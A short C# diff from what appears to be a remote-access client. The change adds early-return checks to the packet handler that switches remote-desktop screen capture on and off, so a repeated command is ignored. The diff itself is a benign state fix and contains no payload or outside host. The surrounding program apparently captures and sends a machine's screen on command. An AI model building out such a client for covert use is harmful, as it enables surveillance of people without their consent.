@@ -96,12 +96,14 @@ namespace Client.Handle_Packet
                             {
                                 case "false":
                                     {
+                                        if (RemoteDesktop.RemoteDesktop_Status == false) return;
                                         RemoteDesktop.RemoteDesktop_Status = false;
                                     }
                                     break;
 
                                 case "true":
                                     {
+                                        if (RemoteDesktop.RemoteDesktop_Status == true) return;
                                         RemoteDesktop.RemoteDesktop_Status = true;
                                         RemoteDesktop.CaptureAndSend();
                                     }
